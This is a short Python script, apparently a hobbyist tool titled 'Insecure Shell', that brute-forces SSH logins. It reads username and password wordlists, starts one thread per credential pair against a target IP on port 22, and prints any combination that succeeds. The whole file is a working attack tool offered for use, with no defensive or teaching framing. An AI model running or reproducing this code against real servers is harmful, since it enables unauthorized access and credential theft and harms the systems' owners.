import paramiko, threading, argparse, socket, sys, time
from datetime import datetime


def check(target, username, password, ptime):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        ctime = int(time.time())
        taken = int(ctime) - int(ptime)
        print(f"""
[STATUS]     >   CRACKED
[END]        >   {datetime.now().strftime('%H:%M:%S')}
[TAKEN]      >   {taken}s
[TARGET]     >   {target}:22
[USERNAME]   >   {username}
[PASSWORD]   >   {password}
        """)
        ssh.close()
        cracked = True
        sys.exit(0)
    except:
        ssh.close()


def load_passwords(file):
    with open(file, encoding='utf-8') as f:
        return [password for password in f.read().splitlines()]

def load_usernames(file):
    with open(file, encoding='utf-8') as f:
        return [username for username in f.read().splitlines()]


def run():

    art = """
╦╔╗╔╔═╗╔═╗╔═╗╦═╗╔═╗  ╔═╗╦ ╦╔═╗╦  ╦  
║║║║╚═╗║╣ ║  ╠╦╝║╣   ╚═╗╠═╣║╣ ║  ║  
╩╝╚╝╚═╝╚═╝╚═╝╩╚═╚═╝  ╚═╝╩ ╩╚═╝╩═╝╩═╝
> Simple python SSH bruteforcer
> Developed by /jwe0"""
    print(art)




    parser = argparse.ArgumentParser(description="Simple python ssh bruteforcer")

    parser.add_argument("--target", "-t", help="Target IP")
    parser.add_argument("--userlist", "-ul", help="Wordlist of usernames")
    parser.add_argument("--passlist", "-pl", help="Wordlist of passwords")

    args = parser.parse_args()

    if args.target:

        passwords = load_passwords(args.passlist)
        usernames = load_usernames(args.userlist)  


        print(f"""
[START]      >   {datetime.now().strftime('%H:%M:%S')}
[TARGET]     >   {args.target}          
[PASSWORDS]  >   {args.passlist} | {len(passwords)}
[USERNAMES]  >   {args.userlist} | {len(usernames)}""")


        for username in usernames:
            for password in passwords:
                threading.Thread(target=check, args=[args.target, username, password, time.time()]).start()
    else:
        print("\n[DEBUG] > Please supply a target and appropriate wordlists")


run()